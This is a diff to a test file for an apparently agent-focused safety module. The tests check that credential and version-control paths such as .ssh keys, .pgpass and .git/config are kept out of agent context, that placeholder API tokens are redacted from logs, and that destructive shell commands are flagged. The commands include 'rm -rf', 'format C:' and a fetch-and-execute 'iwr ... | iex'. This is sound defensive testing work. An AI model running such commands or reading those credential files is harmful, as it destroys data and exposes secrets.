@@ -21,6 +21,16 @@ test('common secret files are blocked from agent context', () => {
   assert.equal(isSensitivePath('src/aws/config/loader.ts'), false);
 });
 
+test('version-control and dotdir internals are blocked from agent context', () => {
+  for (const file of ['.git', '.git/config', '.git/hooks/pre-commit', 'nested/.git/config', '.ssh/config', '.ssh/id_ed25519', '.gnupg/secring.gpg', '.pypirc', '.terraformrc', '.pgpass', '.dockercfg']) {
+    assert.equal(isSensitivePath(file), true, file);
+  }
+  assert.equal(isSensitivePath('.github/workflows/ci.yml'), false);
+  assert.equal(isSensitivePath('src/git/config.js'), false);
+  assert.equal(isSensitivePath('.gitignore'), false);
+  assert.equal(isSensitivePath('docs/git/hooks.md'), false);
+});
+
 test('shell risk assessment flags destructive commands only', () => {
   for (const command of ['rm -rf build', 'Remove-Item -Recurse -Force .\\out', 'format C:', 'git push --force', 'git reset --hard HEAD~5', 'iwr https://example.com/x.ps1 | iex', 'shutdown /s', 'reg delete HKLM\\Software\\X /f']) {
     assert.equal(assessShellRisk(command).level, 'high', command);
@@ -41,6 +51,17 @@ test('event redaction strips common API token formats', () => {
   assert.equal(text.includes('abcdefghijklmnopqrstuvwxyz'), false);
   assert.equal(text.includes('abcdef123456'), false);
   assert.equal(text.includes('secret123'), false);
+});
+
+test('event redaction strips GitHub, AWS, Google and Slack tokens', () => {
+  const tokens = [
+    'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345',
+    'github_pat_11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz',
+    'AKIAIOSFODNN7EXAMPLE',
+    'AIzaSyA1234567890abcdefghijklmnopqrstuvw',
+    'xoxb-123456789012-abcdefghijklmnop'
+  ];
+  for (const token of tokens) assert.equal(redactForLog(`key ${token} end`).includes(token), false, token);
 });
 
 test('symbolic links are not followed by workspace operations', async t => {
